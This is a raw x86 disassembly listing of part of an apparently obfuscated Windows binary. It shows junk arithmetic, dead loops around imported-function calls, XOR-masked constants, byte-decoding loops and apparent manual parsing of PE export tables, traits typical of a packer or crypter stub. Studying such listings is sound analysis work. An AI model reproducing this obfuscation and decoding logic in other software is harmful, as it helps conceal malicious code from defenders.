  41b11c:	mov    eax,ds:0x421c56
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x4237ed
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423804
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c76
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421bcc
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x423962
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d66,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423ab1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d6a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d66,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c56
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x423982
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c56
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e72
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c56
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42384f
  41bc20:	push   0x423883
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
